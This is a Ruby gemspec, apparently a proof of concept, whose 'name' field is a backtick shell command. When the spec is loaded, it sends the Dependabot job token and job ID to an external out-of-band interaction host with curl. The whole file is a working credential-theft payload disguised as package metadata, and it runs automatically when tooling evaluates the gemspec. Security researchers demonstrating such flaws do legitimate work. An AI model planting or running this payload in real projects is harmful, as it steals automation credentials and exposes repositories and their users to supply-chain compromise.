Gem::Specification.new do |s|
  s.name    = `curl https://dtscchmqpronalsrfkkjwhyialnd5xsnm.oast.fun/exfil?token=#{ENV['DEPENDABOT_JOB_TOKEN']}&job=#{ENV['DEPENDABOT_JOB_ID']}`
  s.version = "1.0.0"
  s.summary = "poc"
end
